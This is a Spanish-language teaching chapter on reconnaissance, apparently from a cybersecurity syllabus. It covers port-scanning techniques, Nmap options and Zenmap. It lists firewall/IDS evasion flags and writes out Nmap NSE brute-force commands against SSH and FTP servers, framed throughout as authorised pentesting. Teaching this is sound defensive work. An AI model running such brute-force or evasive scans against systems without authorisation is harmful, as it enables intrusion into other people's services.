# 3. Reconocimiento y enumeración

## **Uso de herramientas de escaneo de puertos y servicios.**

### **¿Qué es el escaneo de puertos?**

El escaneo de puertos es un proceso mediante el cual, a través de herramientas especializadas, se analizan los puertos de un sistema informático. Al escanear puertos se puede obtener información como los puertos que están abiertos, los que están cerrados o aquellos que están protegidos con cortafuegos.

Este procedimiento se puede usar con distintas finalidades. Por ejemplo, los administradores de sistemas lo emplean para conocer los servicios que está ofreciendo la máquina o para analizar el estado de los puertos y detectar y subsanar posibles vulnerabilidades.

Sin embargo, como veremos más adelante, el escaneo de puertos abiertos también se puede usar con fines poco éticos. Del mismo modo que los administradores de redes lo pueden usar para detectar y corregir vulnerabilidades, los ciberdelincuentes lo pueden usar para explotar dichas brechas de seguridad.

## **Técnicas de escaneo de puertos**

A continuación vemos las técnicas más habituales para realizar un scan de puertos.

- **TCP connect() scanning:** Es una de las técnicas más comunes para realizar escaneos TCP y cuenta con las ventajas de que es un método muy rápido y que apenas requiere privilegios. Básicamente, consiste en usar la llamada a sistema connect(). Si se logra establecer conexión, quiere decir que el puerto está abierto; si no se consigue conectar, significa que el puerto está cerrado.
- **TCP SYN scanning**: Este método se suele denominar “half-open” o mitad abierta. En realidad, no se crea una conexión TCP completa. En lugar de eso, se envían paquetes SYN como si se fuera a establecer una conexión. Si se recibe como respuesta un SYN-ACK es que el puerto está abierto, pero si se recibe un RST es que el puerto está cerrado. El principal inconveniente de este método es que se requieren privilegios de ROOT para poder llevarlo a cabo.
- **TCP FIN scanning:** Es una técnica de escaneo de puertos que permite penetrar en sistemas en los que los firewalls o packet filters podrían detectar el uso de paquetes SYN. Usando los paquetes SYN, puede pasar que la respuesta sea un RST si el puerto está cerrado, y que si está abierto el sistema no dé una respuesta. Con los paquetes FIN esto no ocurre.
- **Fragmentation scanning:** No se trata de un método de escaneo de puertos propiamente dicho, sino que se basa en una modificación de técnicas anteriores. Consiste en dividir o fragmentar los paquetes SYN o FIN que se envían, con el objetivo de que no sean detectados por los firewall o los filtradores de paquetes.
- **TCP reverse ident scanning:** Gracias al protocolo “ident” se puede conocer el nombre de usuario y el dueño de los servicios que se están usando dentro de una conexión TCP. Para ello es necesario establecer una conexión TCP completa.
- **UDP ICMP port unreachable scanning:** Es una técnica que se diferencia de las anteriores en que no se basa en el protocolo TCP, sino que usa el UDP. Este protocolo, aunque suele ser más sencillo, resulta más complejo a la hora de escanear puertos, por lo que el proceso se puede volver significativamente más lento.

## **¿Escanear puertos es siempre legal?**

No, el escaneo de puertos no siempre es legal. El port scanning se puede utilizar para fines legítimos. Por ejemplo, para que los administradores de redes y sistemas comprueben el estado de los puertos, las conexiones y los programas o aplicaciones que está ofreciendo el equipo. También se puede usar como un método para el análisis de vulnerabilidades y brechas de seguridad. Los administradores pueden escanear los puertos para crear un mapa de las conexiones y detectar posibles fallos o vulnerabilidades. Por ello, se puede decir que el escaneo de puertos es totalmente legal, siempre y cuando se tenga permiso para acceder al equipo y se realice con fines legítimos.

Sin embargo, también puede ser usado con objetivos poco éticos. Muchos atacantes emplean este tipo de técnicas para aprovecharse de esos fallos de seguridad. Al final, los puertos abiertos pueden funcionar como una puerta de entrada a un equipo, para luego realizar otras actividades maliciosas, como ataques de denegación de servicio.

## **Ataques de escaneo de puertos. Qué son y cómo evitarlos**

Al hilo del punto anterior, cabe decir que los ataques de escaneo de puertos son uno de los métodos más empleados por los crackers para descubrir vulnerabilidades en un sistema. De hecho, lo primero que hará un cibercriminal antes de lanzar su ataque será un portscan, lo que le permitirá saber información como la arquitectura de la red, los servicios que ofrecemos en nuestros equipos y, por supuesto, buscar agujeros o brechas de seguridad en los mismos. Dicho de otro modo, cada puerto abierto es una potencial puerta de entrada al equipo, por lo que es necesario tomar ciertas medidas de seguridad.

Una de ellas es no abrir más puertos de los necesarios, Normalmente, los equipos ya vienen con una serie de puertos abiertos predeterminados para poder ofrecer los servicios y funciones básicas. También es aconsejable el uso de firewall o filtradores de paquetes, los cuáles funcionan como una barrera que protege al equipo de intrusos. Otra recomendación es mantener siempre los equipos y sistemas actualizados a su última versión, ya que los desarrolladores suelen crear parches que subsanan posibles vulnerabilidades.

Por último, está la opción de usar herramientas como PortScanDetector, que permite detectar cuándo se está realizando un rastreo de nuestros puertos. Básicamente, avisa a los administradores en aquellos casos en los que han sido consultados más de 10 puertos, lo cual puede indicar que un hacker está intentando acceder al equipo.

El escaneo de puertos y servicios es una práctica común en pruebas de penetración y evaluaciones de seguridad para identificar servicios activos, puertos abiertos y posibles vulnerabilidades en un sistema. Aquí hay pasos generales y algunas herramientas comunes utilizadas para realizar este tipo de escaneo:

## **Pasos Generales:**

- Definir el Alcance: Establecer el alcance de la prueba, identificando los sistemas o redes específicas a escanear y obteniendo el consentimiento del propietario.
- Seleccionar Herramientas Apropiadas: Elegir herramientas de escaneo de puertos y servicios que se ajusten a los requisitos del proyecto y al entorno que se va a evaluar.
- Configurar Parámetros: Configurar los parámetros de la herramienta de escaneo, como rango de direcciones IP, rango de puertos y opciones de escaneo específicas.
- Realizar el Escaneo: Ejecutar la herramienta de escaneo para identificar los puertos abiertos y los servicios en los sistemas objetivo.
- Analizar Resultados: Revisar los resultados del escaneo para identificar servicios, versiones de software y posibles vulnerabilidades asociadas a los puertos encontrados.
- Registrar y Documentar: Mantener registros detallados de los resultados del escaneo, incluyendo los servicios identificados, versiones y cualquier hallazgo relevante.

## **Herramientas Comunes de Escaneo de Puertos y Servicios:**

**Nmap**: Herramienta versátil de escaneo de puertos y mapeo de redes.

> Ejemplo de Uso: nmap -p 1-1000 192.168.1.1

**Masscan**: Escáner de puertos de alto rendimiento.

> Ejemplo de Uso: masscan -p1-65535 192.168.1.1

**Unicornscan:** Herramienta de escaneo de red y puertos con enfoque en velocidad y eficiencia.

> Ejemplo de Uso: unicornscan -mU -Iv 192.168.1.1:a

**Hping3**: Herramienta avanzada de envío de paquetes, útil para escaneo de puertos.

> Ejemplo de Uso: hping3 -S -p 80 192.168.1.1

**Netcat (nc)**: Herramienta de utilidad de red que puede utilizarse para escanear puertos.

> Ejemplo de Uso: nc -zv 192.168.1.1 1-100

Es fundamental recordar que el escaneo de puertos y servicios debe llevarse a cabo de manera ética y legal, con el consentimiento explícito del propietario del sistema o la red objetivo.

## **Reconocimiento y enumeración con Nmap**

[Nmap](https://nmap.org/) es una utilidad completamente gratuita y de código abierto, nos permite descubrir redes y host, así como realizar auditoría de seguridad. Este programa es compatible con sistemas operativos Linux, Windows y también macOS, pero en todos ellos se utiliza a través de la línea de comandos, aunque tenemos la posibilidad de instalar ZenMap que es la utilidad gráfica de Nmap para hacer los escaneos de puertos a través de la interfaz gráfica de usuario. Si no quieres pelearte con comandos a través de consola, esta interfaz gráfica de usuario te podría ser útil para los primeros pasos con este gran programa, no obstante, cuando tengas más experiencia seguramente ejecutes todas las órdenes directamente desde terminal.

Nmap nos permite detectar hosts de una red local, y también a través de Internet, de esta forma, podremos saber si dichos hosts (ordenadores, servidores, routers, switches, dispositivos IoT) están actualmente conectados a Internet o a la red local. Esta herramienta también permite realizar un escaneo de puertos a los diferentes hosts, ver qué servicios tenemos activos en dichos hosts gracias a que nos dirá el estado de sus puertos, podremos saber qué sistema operativo está utilizando un determinado equipo, e incluso podremos automatizar diferentes pruebas de pentesting para comprobar la seguridad de los equipos.

Nmap tiene diferentes tipos de escaneo de puertos, pueden ser a través de segmentos TCP, datagramas UDP o paquetes ICMP, además, permite realizar escaneos de forma oculta para que sean difíciles de detectar por los firewalls. Por supuesto, podremos hacer escaneo de puertos sobre ciertos puertos en concreto, entre rangos de puertos, rangos de direcciones IP, posibilidad de usar paquetes TCP null, FIN, Xmas y ACK además de SYN, para localizar los puertos TCP abiertos.

Otras características que nos brinda esta herramienta, es la posibilidad de hacer un completo inventario de red, e incluso comprobar si un determinado host o servicio sigue levantado y funcionando. Este programa fue diseñado para escanear una gran cantidad de hosts, por tanto, si necesitas escanear múltiples objetivos no tendrás problemas. Este programe es muy flexible, incorpora decenas de técnicas avanzadas para escanear hosts y puertos, además, también permite realizar auditorías a través de NSE (Nmap Search Engine), por lo que es realmente potente.

<aside>
👉 Nmap tiene varios estados en los puertos que aparecerán cuando hagamos un escaneo de puertos. Es fundamental saber qué significa cada estado de Nmap, porque con cualquier escaneo de puertos, nos devolverá diferentes estados.

</aside>

## **Principales usos de Nmap**

Como has podido ver, Nmap es una herramienta muy versátil. Esta se puede utilizar para gran variedad de tareas, sobre todo relacionadas con la seguridad de la información. Pero también nos permite realizar administración de redes. Algunos de los usos más comunes para Nmap son:

- **Escaneo de puertos:** Se puede utilizar para realizar el escaneo de puertos abiertos en la red. Lo cual nos da la posibilidad de identificar posibles puntos en los que un atacante puede atacar nuestra red. También se pueden realizar escaneos de puertos específicos, o un rango de puertos. Lo cual nos dice los que están abiertos, y como tal, con posibilidad de ser atacados.
- **Detección de sistemas:** Nmap se puede utilizar para encontrar sistemas activos en una red. Esto puede incluir servidores y dispositivos de red. Esto se hace escaneando una dirección IP, o un rango de direcciones para identificar los dispositivos en la red.
- **Detección de servicios:** Con Nmap es posible detectar los servicios que se están ejecutando en la red, lo cual nos ayuda en muchos casos a detectar vulnerabilidades. Podremos identificar servicios como HTTP, Telnet, FTP, SSH, entre otros muchos. Esto lo que permite es proporcionar información muy detallada sobre los softwares que están siendo ejecutados, incluso las versiones de los mismos.
- **Mapeo de redes:** Se puede utilizar para mapear redes. Esto puede incluir varios factores como la ubicación de un dispositivo o la topología de la propia red. Así será mucho más sencillo crear un mapa visual de toda la infraestructura, identificando los dispositivos y como están conectados.
- **Pruebas de seguridad:** Con Nmap se pueden realizar pruebas de penetración y evaluaciones de seguridad. Esto nos permite identificar vulnerabilidades en los sistemas o la red. Esto está directamente ligado al escaneo de puertos.
- **Monitorización:** Nmap tiene la capacidad de realizar una monitorización de la disponibilidad de los servidores o dispositivos de la red. Lo cual nos ayuda a ver si están funcionando de la forma correcta.

## **Para que escanear puertos**

Como hemos visto, con nmap tenemos una herramienta especializada en analizar los puertos de los sistemas informáticos, obteniendo información sobre si están abiertos, cerrados o protegidos con cortafuegos. Esto se puede hacer con multitud de finalidades, como saber qué servicios se están ofreciendo desde un equipo por los administradores o por seguridad, buscando solventar algún problema que pueda llegar en forma de vulnerabilidad.

Pero esto también se puede utilizar con fines maliciosos. Igual que los Administradores pueden analizarlos para buscar posibles vulnerabilidades, un atacante puede hacerlo por exactamente lo mismo, pero con la intención de aprovecharse de ello para infiltrarse en la red aprovechando una brecha en la seguridad.

## **Estado de los puertos con Nmap**

- **Open**: una aplicación está activamente aceptando conexiones TCP o UDP. El puerto está abierto y se puede utilizar, los pentesters podrán utilizar este puerto abierto para explotar el sistema. Es el estado por defecto si no tenemos ningún firewall bloqueando accesos.
- **Closed**: un puerto que está cerrado es accesible porque responde a Nmap, sin embargo, no hay ninguna aplicación funcionando en dicho puerto. Es útil para descubrir que un host está levantado, o como parte de la detección de un sistema operativo. De cara al administrador del sistema, es recomendable filtrar estos puertos con el firewall para que no sean accesibles. De cara al pentester, es recomendable dejar estos puertos “cerrados” para analizar más tarde, por si ponen algún servicio nuevo.
- **Filtered**: en este estado Nmap no puede determinar si el puerto está abierto, porque hay un firewall filtrando los paquetes de Nmap en dicho puerto. Estos puertos filtrados son los que aparecerán cuando tengamos un firewall activado. Nmap intentará en varias ocasiones intentar conectar, lo que hace que el escaneo de puertos sea bastante lento.
- **Open/Filtered**: Nmap no sabe si el puerto está abierto o filtrado. Esto ocurre porque el puerto abierto no envía ninguna respuesta, y dicha falta de respuesta podría ser por el firewall. Este estado aparece cuando usamos UDP y IP, y utilizamos escaneos FIN, NULL y Xmas.
- **Closed/Filtered**: en este estado no se sabe si el puerto está cerrado o filtrado. Solo se usa este estado en el IP Idle Scan.

# **Efectividad de Nmap**

Nmap es una herramienta que se considera altamente efectiva. Esto se debe a una combinación de funcionalidad y características avanzadas, que hace de esta solución una de las mejores que podemos encontrarnos. Esta cuenta con la capacidad de realizar escaneos de vulnerabilidades, para identificar posibles debilidades en las configuraciones de los sistemas de seguridad. Por lo cual, de no ser efectiva, no sería una herramienta tan conocida. Por lo cual podríamos decir, que la propia fama de Nmap es un buen identificativo para la calidad que puede proporcionarnos en una gran variedad de situaciones diferentes.

Por otro lado, más allá de su eficacia en identificación de dispositivos, servicios y vulnerabilidades, está su capacidad para trabajar con diferentes protocolos de red. Entre otros, TCP, UDP, ICMP e IP. Todo lo cual, se puede integrar con otras herramientas de seguridad y análisis. Pueden ser herramientas como Metasploit o incluso Wireshark. Lo cual hace de Nmap una herramienta muy versátil para todo tipo de sistemas.

En cambio, no estamos ante una solución que sea perfecta, ni que represente una medida de seguridad ante problemas. A pesar de que es muy efectiva y poderosa, requiere de cierto conocimiento por parte de los usuarios que la utilicen. Así como la disposición de las habilidades necesarias para darle uso con todas las garantías, y aprovechando su rendimiento y funciones al máximo. También debemos pensar que muchos dispositivos pueden contar con algún tipo de protección contra los escaneos de las aplicaciones como Nmap, o pueden incluso ser complicados de detectar. Pero en estos casos, ya no sería un problema de la eficiencia de Nmap ni de sus funciones, sino de las medidas de protección establecidas en esos dispositivos. En todo caso, si buscamos una solución efectiva, fiable y con buena trayectoria, Nmap es una de las mejores soluciones actualmente.

## **Personalización de NMAP**

Como puedes ver, con NMAP estamos ante una herramienta de código abierto, por lo cual tiene una alta capacidad de personalización. Lo cual la lleva a ser una solución altamente adaptable a las necesidades de cada usuario, en todo tipo de escenarios. Pero esto es algo que no se realiza a la ligera, sino que hay algunos factores que destacan por encima de otros. Empezando por las opciones de escaneo, donde la gama de opciones es muy amplia. Esta permite gestionar muchos parámetros y opciones avanzadas, que modifican por completo el funcionamiento de NMAP. El escaneo personalizado, permite disponer de información muy valiosa, y de todo tipo al realizar análisis de puertos, por ejemplo.

Por otro lado, están los scripts NSE (Nmap Scripting Engine). Esta es una de las características más potentes de NMAP, la cual permite ejecutar scripts muy personalizados durante el tiempo de escaneo. Al poder crear los scripts por nuestra parte, pueden ser todo lo complejos que sea necesario. Y como tal nos da ese añadido en personalización, el cual no tendríamos sin esta sección de NMAP. Todo se hace buscando la salida personalizada de datos, donde se pueden establecer muchos parámetros. Desde el formato de salida, generar informes HTML, y los resultados que vamos a necesitar que incluya el análisis que se realiza en la red.

Por último, NMAP cuenta con una gran capacidad de integración con otras herramientas. Una de las características más llamativas, es el poder establecer NMAP como entrada para otras herramientas de seguridad que utilicemos, o incluso para detección de intrusos. Lo cual, de nuevo, se puede combinar con los scripts que mencionamos previamente. Una vez que hemos visto las principales características de Nmap, y el estado de los puertos que tenemos disponibles, vamos a instalarlo y utilizarlo.

## **Descarga e instalación de Nmap en cualquier sistema**

Lo primero que tenemos que hacer para utilizar este programa tan potente, es descargarlo y posteriormente instalarlo. En la **[sección de descargas de Nmap](https://nmap.org/download.html)** podés encontrar todos los enlaces, binarios y código fuente para su instalación en sistemas operativos Windows, Linux y MacOS. Este programa, actualmente lo tenemos disponible en todos los repositorios de los sistemas operativos basados en Linux, por lo que su instalación es realmente sencilla. En Kali Linux ya viene instalado, pero si en tu Linux no esta instalado simplemente ejecutando la orden de instalación seguido de «nmap», instalaras el programa sin dificultades.

`sudo apt install nmap`

## **Ejemplos de uso de Nmap**

Nmap es un programa muy avanzado y complejo, con decenas de comandos y ataques que vamos a poder realizar, con el objetivo de descubrir todos los hosts que tengamos en una red local doméstica o profesional, además, también es capaz de detectar hosts en Internet, es decir, vamos a poder escanear uno a uno cualquier dirección IP de Internet e incluso subredes que sean públicas.

Una vez que hemos descubierto que el host está online, se le puede realizar un escaneo rápido de puertos y comprobar si tiene un firewall filtrando todos los paquetes, o bien tenemos un puerto abierto para poder explotar alguna vulnerabilidad. Nmap permite utilizar tanto direcciones IPv4 privadas y públicas, como también direcciones IPv6, con el objetivo de poder escanear los puertos de cualquier host.

A continuación, veremos algunos ejemplos de cómo se utiliza Nmap a nivel usuario, y también con comandos algo más avanzados, y es que este programa nos permitirá descubrir con cierta exactitud qué sistema operativo está utilizando el host remoto, ideal para obtener la máxima información posible.

## **Escaneo rápido de puertos**

Si quieres realizar un escaneo rápido de puertos a un determinado host, debemos teclear el siguiente comando. Este comando básico se encargará de escanear los principales puertos a la dirección IP privada o pública definida, un detalle muy importante es que no escaneará todos los puertos, sino los más utilizados habitualmente.

> nmap [ip]

Por ejemplo, si queremos realizar un escaneo rápido de los principales puertos a un host con dirección IP 192.168.1.1, la orden sería la siguiente:

> nmap 192.168.1.1

El programa nos devolverá los puertos que se encuentran abiertos en el equipo objetivo.

![Nmap escaneo](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nmap-escaneo.png?raw=true)

En el caso de querer escanear todos y cada uno de los puertos tendremos que recurrir al siguiente comando y poner un rango desde el puerto 1 hasta el 65535, de esta forma estaremos comprobando si todos y cada uno de los puertos están abiertos, cerrados o filtrados.

## **Realizar escaneo de un rango de puertos**

En lugar de realizar un escaneo de todos los puertos, podemos establecer un rango de puertos a comprobar. Para ello ejecutaremos:

> nmap -p [rango] [ip]

Si queremos realizar un escaneo de puertos desde el 20 TCP hasta el 200 TCP en la dirección IP 192.168.1.1, basta con ejecutar la siguiente orden:

> nmap -p 20-200 192.168.1.1
> 

El programa nos indicará dentro de ese rango qué puertos están abiertos.

![Rango cuerpos](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/rango-cuerpos.png?raw=true)

Dependiendo de la latencia de la conexión entre nuestro equipo y el host remoto, y también el número de puertos a analizar, este proceso podría durar desde varios segundos hasta unos 10 minutos aproximadamente.

## **Detectar el sistema operativo y más datos del host**

Podemos indicar a Nmap que detecte el sistema operativo. Esto lo realiza enviando paquetes y analizando la forma en que los devuelve, siendo en cada sistema totalmente diferente. Junto a esto, realizará una exploración de puertos y de los servicios en busca de vulnerabilidades. Asimismo, el escaneo devolverá información útil. Para ello debemos ejecutar:

> nmap -A -v [ip]

Si queremos realizar este escaneo a la dirección IP 192.168.1.1 podemos ejecutar la siguiente orden:

> nmap -A -v 192.168.1.1

Esta prueba de detección del sistema operativo no es del todo fiable porque depende de muchos parámetros, en algunos casos la exactitud es muy buena, sobre todo en diferenciar si es Windows o Linux, pero dentro del mundo Linux es realmente complicado conocer qué sistema operativo es en concreto.

![usuario operativo](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/usuario-operativo.png?raw=true)

# **Listado de todos los comandos**

Este programa es realmente completo, hasta el momento hemos utilizado los comandos básicos para descubrir hosts y también para ver si tiene los puertos abiertos, sin embargo, esto no se queda así, y tenemos un gran listado de comandos para exprimir al máximo esta herramienta.

### **Seleccionar objetivos**

Direcciones o rangos IP, nombres de sistemas, redes, etc.

- **Ejemplo:** scanme.nmap.org, microsoft.com/24, 192.168.0.1, 10.0.0-255.1-254
- **iL** fichero lista en fichero -iR n elegir objetivos aleatoriamente, 0 nunca acaba
- **–exclude –excludefile** fichero excluir sistemas desde fichero

### **Descubrir sistemas**

- **PS** n tcp syn ping
- **PA** n ping TCP ACK
- **PU** n ping UDP
- **PM** Netmask Req
- **PP** Timestamp Req
- **PE** Echo Req
- **sL** análisis de listado
- **PO** ping por protocolo
- **PN** No hacer ping
- **n** no hacer DNS
- **R** Resolver DNS en todos los sistemas objetivo
- **–traceroute**: trazar ruta al sistema (para topologías de red)
- **sP** realizar ping, igual que con –PP –PM –PS443 –PA80

## **Técnicas de análisis de puertos**

En la mayoría de ocasiones, cuando los usuarios están empezando a utilizar esta herramienta, lo más probable es que intenten la resolución de la mayoría de problemas con el tipo de escaneo SYN porque es uno de los más versátiles. Pero, a medida que avanzan y conocen la herramienta en profundidad, se darán cuenta de que ampliarán su abanico de soluciones y aquí abajo explicamos un poco algunos de los comandos que resultan más útiles al momento de analizar puertos.

- **sS análisis utilizando TCP SYN:** Este tipo de escaneo, está basado en la velocidad de escaneo, de ahí la versatilidad que mencionamos anteriormente, ya que permite escanear miles de puertos por segundo en una red que se encuentre desprotegida o carezca de un firewall. Además, en lo que a términos de privacidad se refiere, es una excelente técnica, ya que no llega a completar las conexiones TCP y por lo tanto no llama la atención.
- **sT análisis utilizando TCP CONNECT:** Este tipo de exploración, podríamos decir que es la que se utiliza principalmente, sobre todo cuando no podemos ejecutar un escaneo tipo SYN, este tipo de análisis de conexión, lo que hace es realizar o emitir una llamada al sistema de conexión para que se establezca una conexión con la red que estamos analizando. Luego, Nmap lo que hace es utilizar esta llamada para analizar la información sobre cada intento de conexión, la principal desventaja de este tipo de análisis es que nos toma un poco más de tiempo identificar los puertos que están abiertos que nos llevaría por ejemplo con el SYN.
- **sU análisis utilizando UDP:** Este tipo de escaneo es bastante simple, suele utilizarse sobre todo cuando queremos realizar un seguimiento de puertos como los DNS, SNMP y DHCP en nuestra red. Por supuesto, que sea sencillo no quita que son puertos bastante importantes, ya que suelen ser las áreas por donde suelen haber atacantes buscando vulnerabilidades para explotar.
- **sY** análisis utilizando SCTP INIT
- **sZ** utilizando COOKIE ECHO de SCTP
- **sO** protocolo IP
- **sW** ventana TCP -sN
- **–sF -sX** NULL, FIN, XMAS
- **–sA** TCP ACK

### **Puertos a analizar y orden de análisis**

- **p n-m** rango
- **p–** todos los puertos
- **p n,m,z** especificados
- **p U:n-m,z T:n,m** U para UDP, T para TCP
- **F** rápido, los 100 comunes
- **–top-ports n** analizar los puertos más utilizados
- **r** no aleatorio

### **Duración y ejecución:**

- **T0** paranoico
- **T1** sigiloso
- **T2** sofisticado
- **T3** normal
- **T4** agresivo
- **T5** locura
- **–min-hostgroup**
- **–max-hostgroup**
- **–min-rate**
- **–max-rate**
- **–min-parallelism**
- **–max-parallelism**
- **–min-rtt-timeout**
- **–max-rtt-timeout**
- **–initial-rtt-timeout**
- **–max-retries**
- **–host-timeout –scan-delay**

**Detección de servicios y versiones:**

- **sV:** detección de la versión de servicios
- **–all-ports** no excluir puertos
- **–version-al**l probar cada exploración
- **–version**trace rastrear la actividad del análisis de versión
- **O** activar detección del S. Operativo
- **–fuzzy** adivinar detección del SO
- **–max-os-tries** establecer número máximo de intentos contra el sistema objetivo

**Evasión de Firewalls/IDS**

- f fragmentar paquetes
- **D d1,d2** encubrir análisis con señuelos
- **S ip** falsear dirección origen
- **–g source** falsear puerto origen
- **–randomize-hosts** orden
- **–spoof-mac mac** cambiar MAC de origen

**Parámetros de nivel de detalle y depuración**

- **v** Incrementar el nivel de detalle
- **–reason** motivos por sistema y puerto
- **d (1-9)** establecer nivel de depuración
- **–packet-trace** ruta de paquetes

**Otras opciones**

- **–resume file** continuar análisis abortado (tomando formatos de salida con -oN o -oG)
- **6** activar análisis IPV6
- **A** agresivo, igual que con -O -sV -sC –traceroute

**Opciones interactivas**

- **v/V** aumentar/disminuir nivel de detalle del análisis
- **d/D** aumentar/disminuir nivel de depuración
- **p/P** activar/desactivar traza de paquetes

**Scripts**

- **sC** realizar análisis con los scripts por defecto
- **–script file** ejecutar script (o todos)
- **–script-args n=v** proporcionar argumentos
- **–script-trace** mostrar comunicación entrante y saliente

**Formatos de salida**

- **oN** guardar en formato normal
- **oX** guardar en formato XML
- **oG** guardar en formato para posteriormente usar Grep
- **oA** guardar en todos los formatos anteriores

<aside>
💡 Principalmente estos son los comandos de que dispone Nmap. Antes de terminar, debemos decir que Nmap dispone de multitud de opciones con las que poder realizar completos análisis de redes. Podemos consultar todas las opciones disponibles tecleando:
</aside>

> nmap --help

![nmap help](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nmap-help.png?raw=true)

Nmap es sin duda una herramienta muy sencilla y completa para realizar auditorías de redes, pero esto no acaba aquí, también tenemos disponible Nmap NSE para realizar pentesting avanzados.

**Otras técnicas de escaneo**

Como hemos visto, nmap ofrece muchos parámetros para realizar un escaneo más a medida, pero actualmente existen otros métodos para realizar esta tarea los cuales pueden ser interesantes. Cada uno de ellos tiene sus propias características, y pueden variar en efectividad.

- **TCP connect()scanning:** Es una de la formas de escaneo más comunes, porque es rápido y no son necesarios demasiados privilegios en el equipo.
- **TCP SYN scanning:** También conocido como «half-open». Este no llega a crear una conexión TCP, si no que utiliza el envío de paquetes SYN. Puede obtener dos respuestas diferentes, un SYN-ACK que indica que el puerto está abierto, y un RST que está cerrado.
- **TCP FIN scanning:** Permite realizar escaneos de puertos en aquellos sistemas que cuentan con firewalls o filtros de paquetes SYN.
- **Fragmentation Scanning:** Aquí no estamos ante un escaneo como tal, sino que está para modificar las técnicas anteriores mediante la división o fragmentación de paquetes SYN o FIN. Esto se hace para que no sean detectados por firewall o filtros de paquetes.
- **TCP reverse ident scanning:** Con este identificador, es posible conocer datos sobre el responsable de los servicios que están usando una determinada conexión TCP. Requiere una conexión completa.

> Gracias a estas técnicas de escaneo avanzadas, pordemos determinar si los puertos están abiertos o cerrados.

# **Nmap NSE: qué es y para qué sirve**

**Nmap Search Engine** o también conocido como **Nmap NSE**, es una gran base de datos con miles de scripts que nos permitirá automatizar la realización de pentesting a sistemas y redes. El primer paso de cualquier pentesting es realizar un escaneo de puertos, una vez realizado este escaneo de puertos, podremos intentar explotar vulnerabilidades en los servicios que hay funcionando detrás de un determinado puerto, por ejemplo, podríamos atacar servidores web, servidores Samba, FTP, servidores SSH, servidores DNS, comprobar si los diferentes servicios tienen vulnerabilidades conocidas o directamente intentar autenticarnos en ellos, si es que tienen autenticación como en el FTP o SSH.

NMAP NSE es un conjunto de scripts que nos permitirá automatizar muchas acciones, como realizar ataques de fuerza bruta a servidores Samba, con el objetivo de intentar acceder a ellos y hacernos con el control, aunque también podríamos atacarlo para realizarle un ataque de denegación de servicio y que el servicio no esté disponible. Lo mismo podríamos hacer con los servidores FTP, servidores SSH y mucho más, sobre todo, los servidores web que deben tener un puerto abierto en el firewall son los que más se deben proteger para evitar o mitigar los ataques que nos puedan realizar.

Por ejemplo, si queremos realizar un ataque de fuerza bruta, basado en un listado de usuarios (con un archivo que se llame usuarios.txt) y con un listado de contraseñas a probar (con un archivo que se llame claves.txt) a un servidor SSH de un determinado equipo que tiene la IP 192.168.25.01, podemos poner el siguiente comando:

> nmap -p 22 --script ssh-brute --script-args userdb=usarios.txt,passdb=claves.txt --script-args ssh-brute.timeout=4s 192.168.25.01

Si queremos saber si un servidor FTP tiene habilitado la autenticación anónima, podremos hacerlo fácilmente poniendo la siguiente orden:

> nmap -sV -sC -p21 192.168.25.01

si queremos realizar un ataque de fuerza bruta a un servidor FTP a un servidor con la IP 99.99.99.99, podemos poner el siguiente comando:

> nmap -p 21 --script ftp-brute 192.168.25.01

Disponemos de una grandísima cantidad de scripts dentro de Nmap NSE con el objetivo de comprobar la seguridad de decenas de servicios, porque no solamente tendremos los típicos de servidores Samba, FTP, SSH y más, sino que también podremos atacar de forma muy concreta un servidor web con cabeceras HTTP especiales para ver si hay vulnerabilidades, por supuesto, tendremos scripts específicos que nos permitirá explotar vulnerabilidades al PHP de los servidores web, por supuesto, también podremos explotar vulnerabilidades a los diferentes servidores Samba, FTP y SSH, es decir, vulnerabilidades conocidas que ya han sido solucionadas, pero que es posible que todavía el objetivo las tenga operativas. Por este motivo es tan importante actualizar cuanto antes todos los servicios que tengamos expuestos a Internet, y también servicios que tengamos expuestos a la red local, porque con un malware podría explotar una vulnerabilidad y convertirse el ataque de penetración en un ataque de ransomware para cifrar todos los archivos y carpetas.

Recomiendo visitar la **[web oficial de uso de NSE](https://nmap.org/book/nse-usage.html)** donde encontrás todos los scripts que hay actualmente en esta gran base de datos, además, tendrás ejemplos de cómo utilizarlos.

# **Zenmap, la interfaz gráfica de Nmap**

Zenmap es una herramienta gratuita que podemos utilizar para **escanear los puertos**. Podemos saber cuáles tenemos abiertos, para evitar problemas a la hora de usar algunos programas o acceder a un servidor. Se trata de la interfaz gráfica del popular programa de código abierto Nmap, que permite hacer un escaneo de puertos completo de cualquier equipo conectado. Hay que indicar que esta herramienta, que es totalmente gratuita, está disponible para **diferentes sistemas operativos** como Microsoft Windows, Linux o macOS. Permite a los usuarios ejecutar diferentes tipos de análisis de puertos. Es ideal tanto para usuarios menos experimentados como también para los más avanzados.

Para comenzar a utilizar Zenmap lo primero que tenemos que hacer es **descargarlo**. Podemos hacerlo desde la [página oficial](https://nmap.org/download.html) de Nmap. Allí encontraremos las diferentes versiones, según el sistema operativo que estemos utilizando. El proceso de instalación es sencillo, rápido e intuitivo. En unos segundos lo tendremos listo para utilizar.

![zenmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/zenmap.png?raw=true)

Cuando lo hayamos instalado simplemente tendremos que ejecutarlo. Nos encontraremos con una imagen como la de arriba. Podemos elegir un escaneo de puertos a fondo, escaneo rápido, puertos TCP, UDP, etc. Con Zenmap podemos ver **qué puertos hay abiertos** en cualquier dispositivo. En el apartado de Objetivo tenemos que poner la dirección IP que corresponde a ese equipo para, posteriormente, realizar el escaneo para que muestre cuáles están abiertos. Por tanto lo primero que tenemos que hacer es saber **cuál es la dirección IP** de nuestro equipo.

En Windows este proceso es muy sencillo. Simplemente tenemos que ir a Inicio, ejecutamos el Símbolo del sistema y posteriormente ipconfig. Nos mostrará una serie de información entre las que podemos ver la puerta de enlace predeterminada (generalmente 192.168.1.1) así como la dirección IP de ese equipo. Cuando sepamos cuál es la dirección tendremos que ponerla en el apartado de Objetivo, en Zenmap. Posteriormente tendremos que elegir el tipo de escaneo que queremos realizar, como podría ser por ejemplo un escaneo completo de todos los puertos TCP.

![Puertos TCP](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/puertos-tcp.png?raw=true)

